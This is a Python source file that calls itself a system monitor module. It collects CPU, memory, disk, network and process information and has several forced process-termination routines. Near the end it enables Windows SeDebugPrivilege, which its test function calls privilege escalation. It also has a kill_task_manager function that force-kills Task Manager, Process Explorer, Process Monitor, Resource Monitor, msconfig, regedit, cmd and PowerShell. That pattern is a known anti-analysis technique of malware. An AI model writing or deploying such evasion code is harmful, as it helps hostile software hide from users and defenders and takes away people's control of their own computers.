"""
System monitor module
Handles system monitoring, process management, and process termination
"""

import os
import subprocess
import signal
import time
from logging_utils import log_message
from dependencies import PSUTIL_AVAILABLE, WINDOWS_AVAILABLE

def get_system_info():
    """Get comprehensive system information."""
    info = {
        'platform': get_platform_info(),
        'cpu': get_cpu_info(),
        'memory': get_memory_info(),
        'disk': get_disk_info(),
        'network': get_network_info(),
        'processes': get_process_count(),
        'uptime': get_system_uptime()
    }
    return info

def get_platform_info():
    """Get platform information."""
    try:
        import platform
        
        return {
            'system': platform.system(),
            'release': platform.release(),
            'version': platform.version(),
            'machine': platform.machine(),
            'processor': platform.processor(),
            'node': platform.node(),
            'platform': platform.platform()
        }
    except Exception as e:
        log_message(f"Error getting platform info: {e}", "error")
        return {}

def get_cpu_info():
    """Get CPU information."""
    try:
        if PSUTIL_AVAILABLE:
            import psutil
            
            return {
                'percent': psutil.cpu_percent(interval=1),
                'count': psutil.cpu_count(),
                'count_logical': psutil.cpu_count(logical=True),
                'freq': psutil.cpu_freq()._asdict() if psutil.cpu_freq() else {},
                'times': psutil.cpu_times()._asdict(),
                'stats': psutil.cpu_stats()._asdict()
            }
        else:
            # Fallback method
            return {
                'percent': get_cpu_percent_fallback(),
                'count': os.cpu_count() or 1
            }
    except Exception as e:
        log_message(f"Error getting CPU info: {e}", "error")
        return {}

def get_cpu_percent_fallback():
    """Fallback method to get CPU percentage."""
    try:
        if WINDOWS_AVAILABLE:
            # Windows WMIC method
            result = subprocess.run([
                'wmic', 'cpu', 'get', 'loadpercentage', '/value'
            ], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
            
            for line in result.stdout.split('\n'):
                if 'LoadPercentage' in line:
                    return float(line.split('=')[1])
        else:
            # Linux /proc/stat method
            with open('/proc/stat', 'r') as f:
                line = f.readline()
                cpu_times = [int(x) for x in line.split()[1:]]
                idle_time = cpu_times[3]
                total_time = sum(cpu_times)
                return (1 - idle_time / total_time) * 100
    except:
        pass
    return 0.0

def get_memory_info():
    """Get memory information."""
    try:
        if PSUTIL_AVAILABLE:
            import psutil
            
            mem = psutil.virtual_memory()
            swap = psutil.swap_memory()
            
            return {
                'total': mem.total,
                'available': mem.available,
                'used': mem.used,
                'free': mem.free,
                'percent': mem.percent,
                'swap_total': swap.total,
                'swap_used': swap.used,
                'swap_free': swap.free,
                'swap_percent': swap.percent
            }
        else:
            return get_memory_info_fallback()
    except Exception as e:
        log_message(f"Error getting memory info: {e}", "error")
        return {}

def get_memory_info_fallback():
    """Fallback method to get memory info."""
    try:
        if WINDOWS_AVAILABLE:
            # Windows WMIC method
            result = subprocess.run([
                'wmic', 'OS', 'get', 'TotalVisibleMemorySize,FreePhysicalMemory', '/value'
            ], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
            
            total, free = 0, 0
            for line in result.stdout.split('\n'):
                if 'TotalVisibleMemorySize' in line:
                    total = int(line.split('=')[1]) * 1024
                elif 'FreePhysicalMemory' in line:
                    free = int(line.split('=')[1]) * 1024
            
            used = total - free
            percent = (used / total) * 100 if total > 0 else 0
            
            return {
                'total': total,
                'free': free,
                'used': used,
                'percent': percent
            }
        else:
            # Linux /proc/meminfo method
            with open('/proc/meminfo', 'r') as f:
                meminfo = {}
                for line in f:
                    parts = line.split()
                    if len(parts) >= 2:
                        key = parts[0].rstrip(':')
                        value = int(parts[1]) * 1024  # Convert KB to bytes
                        meminfo[key] = value
                
                total = meminfo.get('MemTotal', 0)
                free = meminfo.get('MemFree', 0) + meminfo.get('Buffers', 0) + meminfo.get('Cached', 0)
                used = total - free
                percent = (used / total) * 100 if total > 0 else 0
                
                return {
                    'total': total,
                    'free': free,
                    'used': used,
                    'percent': percent
                }
    except:
        pass
    return {}

def get_disk_info():
    """Get disk information."""
    try:
        if PSUTIL_AVAILABLE:
            import psutil
            
            disk_usage = psutil.disk_usage('/')
            disk_io = psutil.disk_io_counters()
            
            return {
                'total': disk_usage.total,
                'used': disk_usage.used,
                'free': disk_usage.free,
                'percent': (disk_usage.used / disk_usage.total) * 100,
                'io_counters': disk_io._asdict() if disk_io else {}
            }
        else:
            return get_disk_info_fallback()
    except Exception as e:
        log_message(f"Error getting disk info: {e}", "error")
        return {}

def get_disk_info_fallback():
    """Fallback method to get disk info."""
    try:
        import shutil
        
        # Get disk usage for root directory
        if WINDOWS_AVAILABLE:
            path = 'C:\\'
        else:
            path = '/'
        
        total, used, free = shutil.disk_usage(path)
        percent = (used / total) * 100 if total > 0 else 0
        
        return {
            'total': total,
            'used': used,
            'free': free,
            'percent': percent,
            'path': path
        }
    except:
        return {}

def get_network_info():
    """Get network information."""
    try:
        if PSUTIL_AVAILABLE:
            import psutil
            
            net_io = psutil.net_io_counters()
            net_connections = len(psutil.net_connections())
            
            return {
                'bytes_sent': net_io.bytes_sent,
                'bytes_recv': net_io.bytes_recv,
                'packets_sent': net_io.packets_sent,
                'packets_recv': net_io.packets_recv,
                'connections': net_connections
            }
        else:
            return get_network_info_fallback()
    except Exception as e:
        log_message(f"Error getting network info: {e}", "error")
        return {}

def get_network_info_fallback():
    """Fallback method to get network info."""
    try:
        if WINDOWS_AVAILABLE:
            # Windows netstat method
            result = subprocess.run([
                'netstat', '-e'
            ], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
            
            lines = result.stdout.split('\n')
            for i, line in enumerate(lines):
                if 'Bytes' in line:
                    if i + 1 < len(lines):
                        stats = lines[i + 1].split()
                        if len(stats) >= 2:
                            return {
                                'bytes_recv': int(stats[0]),
                                'bytes_sent': int(stats[1])
                            }
        else:
            # Linux /proc/net/dev method
            with open('/proc/net/dev', 'r') as f:
                lines = f.readlines()
                total_bytes_recv = 0
                total_bytes_sent = 0
                
                for line in lines[2:]:  # Skip header lines
                    parts = line.split()
                    if len(parts) >= 10:
                        total_bytes_recv += int(parts[1])
                        total_bytes_sent += int(parts[9])
                
                return {
                    'bytes_recv': total_bytes_recv,
                    'bytes_sent': total_bytes_sent
                }
    except:
        pass
    return {}

def get_process_count():
    """Get process count."""
    try:
        if PSUTIL_AVAILABLE:
            import psutil
            return len(psutil.pids())
        else:
            return get_process_count_fallback()
    except Exception as e:
        log_message(f"Error getting process count: {e}", "error")
        return 0

def get_process_count_fallback():
    """Fallback method to get process count."""
    try:
        if WINDOWS_AVAILABLE:
            result = subprocess.run([
                'tasklist', '/fo', 'csv'
            ], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
            return len(result.stdout.split('\n')) - 2  # Subtract header and empty line
        else:
            result = subprocess.run(['ps', 'aux'], capture_output=True, text=True)
            return len(result.stdout.split('\n')) - 2  # Subtract header and empty line
    except:
        return 0

def get_system_uptime():
    """Get system uptime in seconds."""
    try:
        if PSUTIL_AVAILABLE:
            import psutil
            return time.time() - psutil.boot_time()
        else:
            return get_uptime_fallback()
    except Exception as e:
        log_message(f"Error getting uptime: {e}", "error")
        return 0

def get_uptime_fallback():
    """Fallback method to get uptime."""
    try:
        if WINDOWS_AVAILABLE:
            result = subprocess.run([
                'wmic', 'os', 'get', 'lastbootuptime', '/value'
            ], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
            
            for line in result.stdout.split('\n'):
                if 'LastBootUpTime' in line:
                    boot_time_str = line.split('=')[1].split('.')[0]
                    # Parse WMI timestamp format
                    boot_time = time.mktime(time.strptime(boot_time_str, '%Y%m%d%H%M%S'))
                    return time.time() - boot_time
        else:
            with open('/proc/uptime', 'r') as f:
                return float(f.read().split()[0])
    except:
        return 0

def get_running_processes():
    """Get list of running processes."""
    try:
        if PSUTIL_AVAILABLE:
            import psutil
            
            processes = []
            for proc in psutil.process_iter(['pid', 'name', 'memory_info', 'cpu_percent']):
                try:
                    processes.append({
                        'pid': proc.info['pid'],
                        'name': proc.info['name'],
                        'memory': proc.info['memory_info'].rss if proc.info['memory_info'] else 0,
                        'cpu_percent': proc.info['cpu_percent']
                    })
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    continue
            
            return processes
        else:
            return get_processes_fallback()
    except Exception as e:
        log_message(f"Error getting processes: {e}", "error")
        return []

def get_processes_fallback():
    """Fallback method to get processes."""
    try:
        processes = []
        
        if WINDOWS_AVAILABLE:
            result = subprocess.run([
                'tasklist', '/fo', 'csv'
            ], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
            
            lines = result.stdout.split('\n')[1:]  # Skip header
            for line in lines:
                if line.strip():
                    parts = [p.strip('"') for p in line.split(',')]
                    if len(parts) >= 5:
                        try:
                            pid = int(parts[1])
                            name = parts[0]
                            memory_str = parts[4].replace(',', '').replace(' K', '')
                            memory = int(memory_str) * 1024 if memory_str.isdigit() else 0
                            
                            processes.append({
                                'pid': pid,
                                'name': name,
                                'memory': memory,
                                'cpu_percent': 0.0
                            })
                        except (ValueError, IndexError):
                            continue
        else:
            result = subprocess.run(['ps', 'aux'], capture_output=True, text=True)
            lines = result.stdout.split('\n')[1:]  # Skip header
            
            for line in lines:
                if line.strip():
                    parts = line.split()
                    if len(parts) >= 11:
                        try:
                            pid = int(parts[1])
                            cpu_percent = float(parts[2])
                            memory_percent = float(parts[3])
                            name = parts[10]
                            
                            processes.append({
                                'pid': pid,
                                'name': name,
                                'memory': 0,  # Memory not easily available in ps aux
                                'cpu_percent': cpu_percent
                            })
                        except (ValueError, IndexError):
                            continue
        
        return processes
    except Exception as e:
        log_message(f"Error getting processes fallback: {e}", "error")
        return []

def terminate_process_with_admin(process_name_or_pid, force=True):
    """Terminate process with administrative privileges."""
    try:
        if isinstance(process_name_or_pid, str):
            # Process name
            if WINDOWS_AVAILABLE:
                cmd = ['taskkill']
                if force:
                    cmd.append('/F')
                cmd.extend(['/IM', process_name_or_pid])
                
                result = subprocess.run(cmd, capture_output=True, text=True, 
                                      creationflags=subprocess.CREATE_NO_WINDOW)
                
                if result.returncode == 0:
                    log_message(f"Process terminated: {process_name_or_pid}")
                    return True
                else:
                    log_message(f"Failed to terminate {process_name_or_pid}: {result.stderr}", "error")
            else:
                # Linux
                cmd = ['pkill']
                if force:
                    cmd.append('-9')
                cmd.append(process_name_or_pid)
                
                result = subprocess.run(cmd, capture_output=True, text=True)
                return result.returncode == 0
        else:
            # PID
            return terminate_process_by_pid(process_name_or_pid, force)
            
    except Exception as e:
        log_message(f"Error terminating process {process_name_or_pid}: {e}", "error")
        return False

def terminate_process_alternative(process_name_or_pid, force=True):
    """Alternative process termination method."""
    try:
        if PSUTIL_AVAILABLE:
            import psutil
            
            if isinstance(process_name_or_pid, str):
                # Find processes by name
                terminated = False
                for proc in psutil.process_iter(['pid', 'name']):
                    try:
                        if proc.info['name'].lower() == process_name_or_pid.lower():
                            if force:
                                proc.kill()
                            else:
                                proc.terminate()
                            terminated = True
                    except (psutil.NoSuchProcess, psutil.AccessDenied):
                        continue
                return terminated
            else:
                # Terminate by PID
                try:
                    proc = psutil.Process(process_name_or_pid)
                    if force:
                        proc.kill()
                    else:
                        proc.terminate()
                    return True
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    return False
        else:
            return terminate_process_with_admin(process_name_or_pid, force)
            
    except Exception as e:
        log_message(f"Error in alternative process termination: {e}", "error")
        return False

def terminate_process_by_pid(pid, force=True):
    """Terminate process by PID."""
    try:
        if WINDOWS_AVAILABLE:
            cmd = ['taskkill']
            if force:
                cmd.append('/F')
            cmd.extend(['/PID', str(pid)])
            
            result = subprocess.run(cmd, capture_output=True, text=True,
                                  creationflags=subprocess.CREATE_NO_WINDOW)
            
            if result.returncode == 0:
                log_message(f"Process {pid} terminated")
                return True
            else:
                log_message(f"Failed to terminate PID {pid}: {result.stderr}", "error")
                # Try alternative method
                return terminate_process_aggressive(pid)
        else:
            # Linux
            try:
                if force:
                    os.kill(pid, signal.SIGKILL)
                else:
                    os.kill(pid, signal.SIGTERM)
                log_message(f"Process {pid} terminated")
                return True
            except ProcessLookupError:
                log_message(f"Process {pid} not found", "warning")
                return False
            except PermissionError:
                log_message(f"Permission denied to terminate {pid}", "error")
                return False
                
    except Exception as e:
        log_message(f"Error terminating PID {pid}: {e}", "error")
        return False

def terminate_process_aggressive(pid):
    """Aggressive process termination using Windows API."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        import ctypes
        from ctypes import wintypes
        
        # Get process handle
        PROCESS_TERMINATE = 0x0001
        handle = ctypes.windll.kernel32.OpenProcess(PROCESS_TERMINATE, False, pid)
        
        if handle:
            # Terminate process
            result = ctypes.windll.kernel32.TerminateProcess(handle, 1)
            ctypes.windll.kernel32.CloseHandle(handle)
            
            if result:
                log_message(f"Process {pid} terminated aggressively")
                return True
            else:
                log_message(f"Failed to terminate process {pid} aggressively", "error")
        else:
            log_message(f"Could not open process {pid} for termination", "error")
            
    except Exception as e:
        log_message(f"Error in aggressive termination of {pid}: {e}", "error")
    
    return False

def enable_debug_privilege():
    """Enable SeDebugPrivilege for process manipulation."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        import ctypes
        from ctypes import wintypes
        
        # Enable SeDebugPrivilege
        TOKEN_ADJUST_PRIVILEGES = 0x0020
        TOKEN_QUERY = 0x0008
        SE_PRIVILEGE_ENABLED = 0x00000002
        SE_DEBUG_NAME = "SeDebugPrivilege"
        
        # Get current process token
        token = wintypes.HANDLE()
        result = ctypes.windll.advapi32.OpenProcessToken(
            ctypes.windll.kernel32.GetCurrentProcess(),
            TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
            ctypes.byref(token)
        )
        
        if result:
            # Lookup privilege value
            luid = wintypes.LARGE_INTEGER()
            result = ctypes.windll.advapi32.LookupPrivilegeValueW(
                None, SE_DEBUG_NAME, ctypes.byref(luid)
            )
            
            if result:
                # Adjust token privileges
                class TOKEN_PRIVILEGES(ctypes.Structure):
                    _fields_ = [
                        ('PrivilegeCount', wintypes.DWORD),
                        ('Privileges', wintypes.LARGE_INTEGER * 1),
                        ('Attributes', wintypes.DWORD * 1)
                    ]
                
                tp = TOKEN_PRIVILEGES()
                tp.PrivilegeCount = 1
                tp.Privileges[0] = luid
                tp.Attributes[0] = SE_PRIVILEGE_ENABLED
                
                result = ctypes.windll.advapi32.AdjustTokenPrivileges(
                    token, False, ctypes.byref(tp), 0, None, None
                )
                
                if result:
                    log_message("SeDebugPrivilege enabled")
                    return True
            
            ctypes.windll.kernel32.CloseHandle(token)
            
    except Exception as e:
        log_message(f"Error enabling debug privilege: {e}", "error")
    
    return False

def terminate_linux_process(process_name_or_pid, force=True):
    """Terminate process on Linux systems."""
    try:
        if isinstance(process_name_or_pid, str):
            # Process name
            cmd = ['pkill']
            if force:
                cmd.append('-9')
            cmd.append(process_name_or_pid)
        else:
            # PID
            cmd = ['kill']
            if force:
                cmd.append('-9')
            cmd.append(str(process_name_or_pid))
        
        result = subprocess.run(cmd, capture_output=True, text=True)
        
        if result.returncode == 0:
            log_message(f"Linux process terminated: {process_name_or_pid}")
            return True
        else:
            log_message(f"Failed to terminate Linux process {process_name_or_pid}: {result.stderr}", "error")
            return False
            
    except Exception as e:
        log_message(f"Error terminating Linux process {process_name_or_pid}: {e}", "error")
        return False

def kill_task_manager():
    """Kill Task Manager and other system monitoring tools."""
    if not WINDOWS_AVAILABLE:
        return False
    
    tools_to_kill = [
        "taskmgr.exe",
        "ProcessHacker.exe",
        "procexp.exe",
        "procexp64.exe",
        "procmon.exe",
        "procmon64.exe",
        "perfmon.exe",
        "resmon.exe",
        "msconfig.exe",
        "regedit.exe",
        "cmd.exe",
        "powershell.exe",
        "powershell_ise.exe"
    ]
    
    killed_count = 0
    for tool in tools_to_kill:
        try:
            if terminate_process_with_admin(tool, force=True):
                killed_count += 1
                log_message(f"Killed system tool: {tool}")
        except Exception as e:
            log_message(f"Failed to kill {tool}: {e}", "error")
    
    log_message(f"Killed {killed_count} system monitoring tools")
    return killed_count > 0

def test_process_termination_functionality():
    """Test process termination functionality."""
    log_message("Testing process termination functionality...")
    
    # Test getting process list
    processes = get_running_processes()
    log_message(f"Found {len(processes)} running processes")
    
    # Test process info
    if processes:
        sample_proc = processes[0]
        log_message(f"Sample process: PID {sample_proc['pid']}, Name: {sample_proc['name']}")
    
    # Test privilege escalation
    if WINDOWS_AVAILABLE:
        if enable_debug_privilege():
            log_message("Debug privilege enabled successfully")
        else:
            log_message("Failed to enable debug privilege", "warning")
    
    log_message("Process termination functionality test completed")
